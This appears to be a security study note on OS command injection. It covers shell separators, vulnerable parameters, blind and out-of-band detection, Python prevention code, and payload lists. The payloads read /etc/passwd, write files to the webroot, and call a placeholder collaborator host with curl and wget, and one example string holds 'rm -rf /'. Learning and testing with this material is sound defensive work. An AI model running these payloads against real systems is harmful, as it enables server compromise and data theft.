also called
# Command or Shell injection

It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data

**OS Command Injection** is a vulnerability where you force the website to run **System Commands** on its own server or host machine through a vulnerable application.

OS Command Injection occurs when:

    - Application executes system commands using user input
    - User input is not properly sanitized
    - Attacker injects additional commands
    - Server executes attacker's commands


Attack flow:
```
User input: 127.0.0.1; whoami
Server runs: ping 127.0.0.1; whoami
Result: Ping output + "www-data" (current user)
```
The semicolon (;) ends the first command and starts a new one!
### **How it Works (The "Separators")**

The server runs commands in a line. Hackers use **Separators** to end the first command and start their own.

**The Magic Symbols (Separators):**

- **`;` (Semicolon):** "Finish the first command, **THEN** do mine." (Linux only)
    
- **`|` (Pipe):** "Take the first command's result, **GIVE** it to mine." (Linux & Windows)
    
- **`&` (Ampersand):** "Run the first command **AND** mine together." (Linux & Windows)

| **Separator**<br> | **Linux** | \|**Windows** |
| ----------------- | --------- | ------------- |
| `;`(Semicolon)    | ✅ **Yes** | ❌ **No**      |
| `&` (Ampersand)   | ✅ **Yes** | ✅ **Yes**     |
| `&&` (Double And) | ✅ **Yes** | ✅ **Yes**     |
| \| (Pipe)         | ✅ **Yes** | ✅ **Yes**     |
| `%0a` (New Line)  | ✅ **Yes** | ❌ **No**      |
#### OS Command Injection Operators

##### Linux/Unix Operators

| Operator | Name | Description | Example |
|----------|------|-------------|---------|
| ; | Semicolon | Execute commands sequentially | cmd1; cmd2 |
| && | AND | Execute cmd2 if cmd1 succeeds | cmd1 && cmd2 |
| \|\| | OR | Execute cmd2 if cmd1 fails | cmd1 \|\| cmd2 |
| \| | Pipe | Pass output of cmd1 to cmd2 | cmd1 \| cmd2 |
| \`\` | Backticks | Execute command inside | \`whoami\` |
| $() | Substitution | Execute command inside | $(whoami) |
| \n | Newline | Start new command | cmd1%0acmd2 |
| & | Background | Run cmd1 in background, then cmd2 | cmd1 & cmd2 |

##### Windows Operators

| Operator | Name            | Description                   | Example        |
| -------- | --------------- | ----------------------------- | -------------- |
| &        | AND             | Execute both commands         | cmd1 & cmd2    |
| &&       | Conditional AND | Execute cmd2 if cmd1 succeeds | cmd1 && cmd2   |
| \|       | Pipe            | Pass output to cmd2           | cmd1 \| cmd2   |
| \|\|     | OR              | Execute cmd2 if cmd1 fails    | cmd1 \|\| cmd2 |


example:-

- **Website:** "Enter IP to ping."
    
- **You type:** `google.com | whoami`
    
- **Server runs:** `ping google.com` -> takes result -> runs `whoami` -> shows you `root` (Admin user).


### **Vulnerable Spots (Where to look?)**

Look for any feature where the website talks to the **Operating System**.

1. **Checking Status:** (Ping, IP check, Domain check).
    
2. **File Operations:** (Image conversion, Video processing).
    
3. **Sending Emails:** (Contact forms that use system mail).
    
4. **Admin Tools:** (System backup, Log viewer).


##### Common Vulnerable Parameters
```
?cmd=
?exec=
?command=
?execute=
?ping=
?query=
?host=
?ip=
?file=
?path=
?dir=
?daemon=
?upload=
?download=
?log=
?create=
?delete=
?folder=
?prefix=
?run=
?process=
```



### **Types of Attack**

#### **A. In-Band/Verbose (Visible)**

- **What happens:** You execute a command, and the **result appears on your screen**.
    
- **Example:** You type `| whoami` and the website shows `root`.
    

#### **B. Blind (Invisible)**

- **What happens:** You execute a command, but the **screen shows nothing**.
    
- **How to hack:** You make the server "Signal" you.
    
    - **Time Delay:** Type `| sleep 10`. If the website freezes for 10 seconds, you are in.
        
    - **Redirection:** Type `whoami > output.txt`. Then open `website.com/output.txt` to see the result.

#### Method A: Time-Based Detection
```BASH
# Linux - sleep command
127.0.0.1; sleep 10
127.0.0.1 && sleep 10
127.0.0.1 | sleep 10

# Windows - ping delay
127.0.0.1 & ping -n 10 127.0.0.1
```
If response takes 10 seconds longer → Command executed!

#### Method B: DNS/HTTP Callback (Out-of-Band)
In this type we need a DNS and server to get HTTP/DNS response 
Burpsuite Collaborator work as DNS/SERVER here.
```BASH
# Using curl
127.0.0.1; curl http://YOUR-BURP-COLLABORATOR.com

# Using wget
127.0.0.1; wget http://YOUR-BURP-COLLABORATOR.com

# Using nslookup
127.0.0.1; nslookup YOUR-BURP-COLLABORATOR.com

# Using ping
127.0.0.1; ping -c 1 YOUR-BURP-COLLABORATOR.com
```
Check Burp Collaborator for incoming requests!
#### Method C: File Creation
```BASH
# Create a file
127.0.0.1; touch /tmp/pwned
127.0.0.1; echo "pwned" > /var/www/html/test.txt

# Check if file exists via web
https://target.com/test.txt
```

### **The Impact (Why is it dangerous?)**

This is **Critical**.

- **RCE (Remote Code Execution):** You fully control the server.

- **Data Theft:** You can read passwords and files.

- **System Destruction:** You can delete the entire OS.

- Full server compromise

- Backdoor installation

### **Prevention (How to Fix)**

If you are the developer:

1. **Stop using Shell:** Don't use functions like `exec()` or `system()`. Use proper libraries instead.
    
2. **Whitelist Input:** Only allow safe characters (like A-Z, 0-9). **Block** symbols like `;` `|` `&`.

#### 1: Avoid System Commands
Don't use shell commands when language has built-in functions
```Python
# ❌ BAD - Using system command
import os
os.system("rm " + filename)

# ✅ GOOD - Using built-in function
import os
os.remove(filename)
```

#### 2. Use Safe APIs (No Shell)
Pass arguments as list, not string
```python
import subprocess

# ❌ BAD - shell=True is dangerous
subprocess.run("cat " + filename, shell=True)

# ✅ GOOD - arguments as list, no shell
subprocess.run(["cat", filename], shell=False)
```
shell=True	Input goes through shell → can inject commands
shell=False	Input treated as plain text → injection blocked

#### 3. Input Validation (Whitelist)
Only allow specific safe characters
```python
import re

def is_safe_input(user_input):
    # Only allow letters, numbers, underscore
    pattern = r'^[a-zA-Z0-9_]+$'
    return bool(re.match(pattern, user_input))

# Usage
filename = input("Enter filename: ")

if is_safe_input(filename):
    # Safe to use
    print("Valid input")
else:
    print("Invalid input - rejected!")
```

#### 4. Escape Special Characters
Make dangerous characters harmless
```python
import shlex

user_input = "file.txt; rm -rf /"

# Escape the input
safe_input = shlex.quote(user_input)

print(safe_input)
# Output: 'file.txt; rm -rf /'
# Now treated as plain text, not command
```

#### 5. Least Privilege
Run application with minimum permissions
```
❌ BAD:  App runs as root (admin)
         → Attacker gets full control

✅ GOOD: App runs as limited user
         → Attacker has restricted access
```
#### Basic Payloads (Linux)
```Bash
# Using semicolon
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; cat /etc/passwd

# Using AND
127.0.0.1 && whoami
127.0.0.1 && cat /etc/passwd

# Using OR
|| whoami
| whoami

# Using pipe
127.0.0.1 | whoami

# Using backticks
127.0.0.1 `whoami`

# Using command substitution
127.0.0.1 $(whoami)

# Using newline
127.0.0.1%0awhoami
127.0.0.1%0d%0awhoami
```

#### Basic Payloads (Windows)
```cmd
# Using &
127.0.0.1 & whoami
127.0.0.1 & dir

# Using &&
127.0.0.1 && whoami

# Using |
127.0.0.1 | whoami

# Using ||
|| whoami
```